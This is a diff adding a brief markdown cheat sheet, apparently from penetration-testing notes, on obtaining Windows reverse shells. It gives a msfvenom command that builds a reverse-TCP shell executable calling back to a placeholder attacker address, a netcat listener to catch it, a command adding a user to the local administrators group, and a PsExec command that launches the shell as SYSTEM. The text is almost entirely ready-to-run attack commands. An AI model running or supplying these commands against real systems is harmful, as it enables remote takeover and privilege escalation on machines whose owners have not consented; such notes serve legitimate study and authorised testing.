@@ -1,0 +1,26 @@
+# Reverse Shell
+There are different ways to spawn shells in Windows.
+
+## msfvenom
+
+```console
+# From kali
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o /home/kali/Desktop/reverse.exe
+rlwrap nc -nvlp {PORT}
+```
+
+## RDP
+If RDP is available, we can add out user to the administrators group and spawn an administrator command prompt with the following command with 
+
+```console
+# From target
+net localgroup administrator {USERNAME} /add
+```
+
+## Admin -> System
+To escalate from an admin user to full SYSTEM user, we can use the tool `PsExec` 
+
+``` console
+.\PsExec64.exe -accepteula -i -s reverse.exe
+```
+
